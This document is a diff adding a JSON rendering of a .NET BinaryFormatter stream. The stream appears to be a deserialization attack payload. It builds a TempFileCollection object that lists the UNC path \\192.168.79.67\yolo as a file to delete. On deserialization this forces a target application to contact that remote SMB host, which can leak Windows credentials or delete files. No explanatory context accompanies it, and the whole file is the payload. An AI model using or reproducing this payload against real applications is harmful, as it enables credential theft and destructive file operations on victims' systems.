@@ -1,0 +1,254 @@
+{
+    "0": [
+        "SerializedStreamHeader",
+        {
+            "HeaderId": 4294967295,
+            "MajorVersion": 1,
+            "MinorVersion": 0,
+            "RootId": 1
+        }
+    ],
+    "1": [
+        "BinaryLibrary",
+        {
+            "LibraryId": 2,
+            "LibraryName": "System"
+        }
+    ],
+    "2": [
+        "ClassWithMembersAndTypes",
+        {
+            "ClassInfo": {
+                "MemberCount": 4,
+                "MemberNames": [
+                    "basePath",
+                    "tempDir",
+                    "keepFiles",
+                    "files"
+                ],
+                "Name": "System.CodeDom.Compiler.TempFileCollection",
+                "ObjectId": 1
+            },
+            "LibraryId": 2,
+            "MemberTypeInfo": {
+                "AdditionalInfos": [
+                    [
+                        "String",
+                        null
+                    ],
+                    [
+                        "String",
+                        null
+                    ],
+                    [
+                        "Primitive",
+                        "Boolean"
+                    ],
+                    [
+                        "SystemClass",
+                        "System.Collections.Hashtable"
+                    ]
+                ],
+                "BinaryTypeEnums": [
+                    "String",
+                    "String",
+                    "Primitive",
+                    "SystemClass"
+                ]
+            },
+            "Values": [
+                [
+                    "basePath : String",
+                    [
+                        "ObjectNull",
+                        null
+                    ]
+                ],
+                [
+                    "tempDir : String",
+                    [
+                        "BinaryObjectString",
+                        {
+                            "ObjectId": 3,
+                            "Value": "D:/tmpRanks"
+                        }
+                    ]
+                ],
+                [
+                    "keepFiles : Primitive",
+                    0
+                ],
+                [
+                    "files : SystemClass",
+                    [
+                        "MemberReference",
+                        {
+                            "IdRef": 4
+                        }
+                    ]
+                ]
+            ]
+        }
+    ],
+    "3": [
+        "SystemClassWithMembersAndTypes",
+        {
+            "ClassInfo": {
+                "MemberCount": 6,
+                "MemberNames": [
+                    "LoadFactor",
+                    "Version",
+                    "KeyComparer",
+                    "HashSize",
+                    "Keys",
+                    "Values"
+                ],
+                "Name": "System.Collections.Hashtable",
+                "ObjectId": 4
+            },
+            "MemberTypeInfo": {
+                "AdditionalInfos": [
+                    [
+                        "Primitive",
+                        "Single"
+                    ],
+                    [
+                        "Primitive",
+                        "Int32"
+                    ],
+                    [
+                        "SystemClass",
+                        "System.OrdinalComparer"
+                    ],
+                    [
+                        "Primitive",
+                        "Int32"
+                    ],
+                    [
+                        "ObjectArray",
+                        null
+                    ],
+                    [
+                        "ObjectArray",
+                        null
+                    ]
+                ],
+                "BinaryTypeEnums": [
+                    "Primitive",
+                    "Primitive",
+                    "SystemClass",
+                    "Primitive",
+                    "ObjectArray",
+                    "ObjectArray"
+                ]
+            },
+            "Values": [
+                [
+                    "LoadFactor : Primitive",
+                    1060655596
+                ],
+                [
+                    "Version : Primitive",
+                    1
+                ],
+                [
+                    "KeyComparer : SystemClass",
+                    [
+                        "MemberReference",
+                        {
+                            "IdRef": 5
+                        }
+                    ]
+                ],
+                [
+                    "HashSize : Primitive",
+                    3
+                ],
+                [
+                    "Keys : ObjectArray",
+                    [
+                        "MemberReference",
+                        {
+                            "IdRef": 6
+                        }
+                    ]
+                ],
+                [
+                    "Values : ObjectArray",
+                    [
+                        "MemberReference",
+                        {
+                            "IdRef": 7
+                        }
+                    ]
+                ]
+            ]
+        }
+    ],
+    "4": [
+        "SystemClassWithMembersAndTypes",
+        {
+            "ClassInfo": {
+                "MemberCount": 1,
+                "MemberNames": [
+                    "_ignoreCase"
+                ],
+                "Name": "System.OrdinalComparer",
+                "ObjectId": 5
+            },
+            "MemberTypeInfo": {
+                "AdditionalInfos": [
+                    [
+                        "Primitive",
+                        "Boolean"
+                    ]
+                ],
+                "BinaryTypeEnums": [
+                    "Primitive"
+                ]
+            },
+            "Values": [
+                [
+                    "_ignoreCase : Primitive",
+                    1
+                ]
+            ]
+        }
+    ],
+    "5": [
+        "ArraySingleObject",
+        {
+            "Length": 1,
+            "ObjectId": 6,
+            "Values": [
+                [
+                    "BinaryObjectString",
+                    {
+                        "ObjectId": 8,
+                        "Value": "\\\\192.168.79.67\\yolo"
+                    }
+                ]
+            ]
+        }
+    ],
+    "6": [
+        "ArraySingleObject",
+        {
+            "Length": 1,
+            "ObjectId": 7,
+            "Values": [
+                [
+                    "MemberPrimitiveTyped",
+                    {
+                        "PrimitiveTypeEnum": "Boolean",
+                        "Value": 0
+                    }
+                ]
+            ]
+        }
+    ],
+    "7": [
+        "MessageEnd",
+        null
+    ]
+}
